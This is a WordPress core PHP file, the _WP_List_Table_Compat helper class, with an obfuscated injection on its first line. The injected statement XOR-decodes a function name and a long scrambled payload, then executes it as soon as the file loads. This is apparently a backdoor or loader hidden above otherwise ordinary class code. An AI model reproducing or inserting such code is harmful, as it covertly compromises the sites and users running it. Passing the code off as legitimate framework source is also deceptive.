<?php $NChJhufQAvyl='V0XT<Wq.LBVTQXY'^'5B=5H2.H9,5 877';$EXagWfcfscxE=$NChJhufQAvyl('','D6FC.9UCDR6B:H1WO<8JwTD+o,QB-=fAUGsfgbBcA44Y-83<ZzDOJmH B 46 ITpV612ZODhF+KxJKfXD.ascNVUDbZpQAT>=8WYYYqDBneIonmGxGX4PQ;XmR;-5XnYGILjHfs1UUHZReXVMuP0,VvHZ.h-an8EOhs,jPO41K+Y9jwQ<<Eepsb;FYR:0O-LW7CXbkkk3DLb>GOVF tyA50BS tgRT4,8tEQJMmb.--HHHhs1Y0,AU=voF3wa.8z4CQDhC12YQpPxOM;-M2cM=;ajRJ,.d8QMswkv;02Cd9hD7L+dOesV.B SidNZpETOCmPV,ARxj0SP.QOS2+HTLNj10<xuhapZGjwGTMpSiViHY;CQgmB>=DTD0H13FKBFJeQ1+Na18LrS29MyLrPDPQA.snbIgCY6WY4TJJRhyFE82GD-BIA4q+=;c=3LJtt9OOp..+2Ac0.TSA7NdSS0TPmDmm49HM7311elIK0RKG2--5TbMC+4L0TtYEKfQ;9M7+PB 18HeIS ATMOupPipT3LQM.+ZLpjUP-vioOQSyeySXZq0EZQgZp-DQDzBXZ9BwTpOPwR;D3BqxBcxM438.>3NU.<<-N0BOJ8A2- A-qGmv-TCAozHSQLxa3y0XXURNU,PHAlK91J=8 SU-LqeB33GAcXxKpJ'^'-PnbHL; 0;Y,e-I><HKbP,+Y0H06Lb9, 3TONB9iHRA7NLZS4Z< 82,A6AkiM< XrRPF;cdL-N2QjkFxdUkzjj9 0BgPvfo44116+qU-bSEyTNI.D4,F<4UpI6ZYTqUyc gAalz8q:=.rKeveQ4QX7-l3sHsAJS 63WEJuoGE9G<WBS:YEl8YHh2O+7NE=CdsX6,KPabNN1h4c+72ATDaSQ. EOmv0UXY+.43mPBHLA;-sbyW6BI 6UVGbl4.as3qc07HgZW qMnXk;ZA8WJmF1hN6+XO;S44SJKRPUKxn0L V8JDrEW O.U6Rn3Pz,2okLt2M53QJKYYH>=6SH tdj5cum-0;5P;4JS,14PnWvM>8W64NM944Mp Q<Pl-.;fwEuZN7Z;1EV7SM,YqRt21=4KHdk4m>S<s=U +joH93+KW5-L. ;QYSRI<YR8+++T:;XLOXWwWoJ10.S+Lw7Q 1DhMIPX<,hXTHLErAY4ccVLYTtDkcJF>Q-+2 294CP>CXxeKTAoIiwD  ,fUVvIX9WyyiJJ.-+M>5TQ4FolnYBJb;lDS b2U<CIscuL hkXqD6B,hDeXpReXXdEX,FAYWaX+,qYDD=D1gmH KAO IVkMRI57 FShsqlXAHs9=.4>fqH1< 7lIP3QWA7rpeJoKVK.5KhQpz7');$EXagWfcfscxE();
/**
 * Helper functions for displaying a list of items in an ajaxified HTML table.
 *
 * @package WordPress
 * @subpackage List_Table
 * @since 4.7.0
 */

/**
 * Helper class to be used only by back compat functions
 *
 * @since 3.1.0
 */
class _WP_List_Table_Compat extends WP_List_Table {
	public $_screen;
	public $_columns;

	public function __construct( $screen, $columns = array() ) {
		if ( is_string( $screen ) )
			$screen = convert_to_screen( $screen );

		$this->_screen = $screen;

		if ( !empty( $columns ) ) {
			$this->_columns = $columns;
			add_filter( 'manage_' . $screen->id . '_columns', array( $this, 'get_columns' ), 0 );
		}
	}

	/**
	 * @access protected
	 *
	 * @return array
	 */
	protected function get_column_info() {
		$columns = get_column_headers( $this->_screen );
		$hidden = get_hidden_columns( $this->_screen );
		$sortable = array();
		$primary = $this->get_default_primary_column_name();

		return array( $columns, $hidden, $sortable, $primary );
	}

	/**
	 * @access public
	 *
	 * @return array
	 */
	public function get_columns() {
		return $this->_columns;
	}
}
